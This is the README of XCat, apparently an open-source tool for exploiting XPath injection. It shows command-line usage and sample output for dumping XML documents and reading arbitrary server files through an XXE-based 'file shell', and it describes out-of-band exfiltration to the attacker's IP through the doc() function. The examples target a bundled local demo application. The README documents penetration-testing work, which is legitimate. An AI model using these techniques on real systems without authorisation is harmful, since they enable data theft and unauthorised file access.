About XCat
==========

Features
--------
* Exploits both GET and POST attacks
* Extracts all nodes, comments, attributes and data from the entire XML document
* Small and lightweight (only a few pure-python dependencies)
* Parallel requests
* XPath 2.0 supported (with graceful degrading to 1.0)
* Advanced data postback through HTTP (see below)
* Arbitrarily read XML files on the servers file system via the doc() function (see below)
* Arbitrarily read text files on the servers file system via crafted SYSTEM entities

Features planned for future releases:

* [Regex](http://www.w3.org/TR/xpath-functions/#func-matches) pattern matching to reduce character search space
* [Unicode normalization](http://www.w3.org/TR/xpath-functions/#func-normalize-unicode)
* Error based retrieval

Examples
--------
If you run a windows machine you can install IronPython and start the example application (example_application/ironpython_site.py).
The syntax for a simple command you can execute against this server is:

    xcat --public-ip="localhost" http://localhost:80 title=Bible title "Book found" run retrieve

This command specifies the target URL (our localhost server), the GET or POST data to send (title=Bible), the vulnerable
parameter (title) and a string to indicate a true response (Book found). Executing this will retrieve the entire XML file
being queried.

    >> xcat --public-ip="localhost" http://localhost:80 title=Bible title "Book found" run retrieve
    Injecting using SingleQuoteString
    Detecting features...
    Supported features: XPath 2, String to codepoints, External DOC function, Entity injection, Substring search speedup
    Retrieving /*[1]
    <?xml version="1.0" encoding="utf-8"?>
    <lib test="1" attribute1="3">
        <book>
                <!-- Comment -->
                <title>Bible</title>
                <description another="attribute">The holy book</description>
    ...

The the retrieval of documents can be sped up in a number of different ways, such as using the doc function to make the
server send data directly to XCat (explained in more detail below). Each of the techniques is called a feature and can
be viewed by using the `test_injection` command. This will display information about the injection, including the
type (integer, string, path name) and various features that XCat has is able to use. XCat knows which features
are best and will gracefully degrade if they fail for any reason.

    >> xcat --public-ip="localhost" http://localhost:80 "title=Bible" title "Book found" test_injection
    Testing parameter title:
    SingleQuoteStringInjection:             /lib/book[name='?']
        - XPath2
        - CodepointSearch
        - DocFeature
        - EntityInjection
        - EfficientSubstringSearch

Usage
-----
Before specifying what data you want to extract from the injection you need to tell XCat how to exploit it. XCat can't
do this for you, so you have to do the initial hard work of finding a vulnerability. XCat needs a target URL it can
reach, URL encoded arguments, the vulnerable parameter and a string to match in the response. The initial data given
must be valid and trigger either a true or false response.

    Usage: xcat [OPTIONS] TARGET ARGUMENTS TARGET_PARAMETER MATCH_STRING
                      COMMAND [ARGS]...

    Options:
      --method TEXT                   HTTP method to use
      --true                          match_string indicates a true response
      --false                         match_string indicates a false response
      --loglevel [debug|info|warn|error]
      --logfile FILENAME
      --public-ip TEXT                Public IP address to use with OOB
                                      connections
      --help                          Show this message and exit.

    Commands:
      run
      test_injection  Test parameter for injectability

The two most useful commands are `run retrieve` and `run file_shell`. The first allows you to retrieve the whole document
being processed by the query in either XML or JSON format and specify a file for it to be dumped to.

    Usage: xcat-script.py run retrieve [OPTIONS]

    Attempt to retrieve the whole XML document

    Options:
      --query TEXT         Query to retrieve. Defaults to root node (/*[1])
      --output FILENAME    Location to output XML to
      --format [xml|json]  Format for output
      --help               Show this message and exit.

The second command takes no additional arguments but enables you to read arbitrary files on the filesystem. This only
works if the vulnerable parameter supports the doc feature (and optionally entity injection):

    >> xcat --public-ip="localhost" http://localhost:80 "title=Bible" title "Book found" run file_shell
    Injecting using SingleQuoteString
    Detecting features...
    Supported features: XPath 2, String to codepoints, External DOC function, Entity injection, Substring search speedup
    There are three ways to read files on the file system using XPath:
     1. inject: Can read arbitrary text files as long as they do not contain any XML
     2. comment: Can read arbitrary text files containing XML snippets, but cannot contain '-->'
     3. doc: Reads valid XML files - does not support any other file type. Supports remote file URI's (http) and local ones.
    Type doc, inject or comment to switch modes. Defaults to inject
    Type uri to read the URI of the document being queried
    Note: The URI should have a protocol, e.g: file:///test.xml. Bad things may happen if the URI does not exist, and it is best to use absolute paths.
    >> uri
    URI: file:///C:/Users/x/xcat/src/example_application/input.xml
    >> file:///C:/Users/x/xcat/src/example_application/
    secret.txt
    secret.xml
    ...
    >> doc
    Switched to doc mode
    >> file:///C:/Users/x/xcat/src/example_application/secret.xml
    <?xml version="1.0" encoding="utf-8"?>
    <this_contains_xml>
        <node>
            hello
    ...
    >> inject
    Switched to inject mode
    >> file:///C:/Users/x/xcat/src/example_application/secret.txt
    This is a secret file. Do not read me!

### Simple usage with the example application
Check out the [readme](src/example_application) to try out XCat with the provided example application.


HTTP Postback / doc function and entity injection
----------------------------

Possibly the most advanced feature of XCat is its 'HTTP postback' feature. The XPath 2.0 schema defines a function
called [doc](http://www.w3.org/TR/xpath-functions/#func-doc) which allows the programmer to load external documents
from the file system or even from a remote network resource via HTTP/HTTPS. If the doc function is enabled and working
then XCat will use it where possible to greatly speed up document retrieval times. It does this by running a small HTTP
server within the program which listens on a specified port and by then calling the doc() function with the currently
targeted node's data URI encoded and appended to a query. This means the XPath library will make a HTTP request to your
IP (requires the port to be forwarded and/or a public IP) in the following format similar to:

	http://YOUR_IP/?data=some%20data%20goes%here

This is far more efficient than iterating over the string character by character and can greatly reduce the retrieval times.

You can (ab)use this function to load XML file on the system, as long as you have read permissions over it, allowing
you to retrieve lots of lovely XML configuration files - you can jump into a pseudo-shell within XCat by using
the fileshell command (shown above) and enter the file path for an XML file.

This can be taken one step further by using entity injection to read arbitrary files on the file system. XCat does this
by starting a HTTP server and makes the vulnerable application load an XML file from it. This XML file contains crafted
DOCTYPE declarations that cause the application to include local files in the XML file as it is being parsed, the contents
of which can then be queried and sent back to XCat in another HTTP request.

[This OWASP wiki page](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) covers XML entity
injection this technique in more detail.
